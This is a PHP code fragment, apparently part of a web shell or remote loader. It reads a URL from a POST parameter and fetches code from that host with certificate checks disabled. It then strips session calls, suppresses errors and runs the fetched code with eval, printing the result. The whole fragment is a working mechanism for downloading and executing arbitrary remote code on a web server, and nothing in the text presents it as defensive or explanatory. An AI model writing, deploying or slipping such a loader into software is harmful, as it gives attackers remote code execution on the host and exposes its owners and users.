    $ch = curl_init($_POST['remote_url']);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    
    $code = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err || empty($code)) {
        echo "<pre>❌ ERROR: $err</pre>";
    } else {
        // **ULTIMATE SESSION KILLER**
        $code = preg_replace('/<\?php\s+session_start\s*\(\s*\)\s*;?/i', '<?php //session fixed', $code);
        $code = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '//session_start() removed', $code);
        
        // Suppress ALL errors
        ob_start();
        
        // **NUKE SESSION BEFORE EVAL**
        if (function_exists('session_status') && session_status() === PHP_SESSION_ACTIVE) {
            @session_write_close();
        }
        
        // **DIRECT EVAL - NO PHP TAG**
        @eval('?>' . $code);
        
        $output = ob_get_clean();
        echo "<pre style='background:#1a202c;color:#a0aec0;'>" . htmlspecialchars($output) . "</pre>";
    }
    echo "</div>";
}
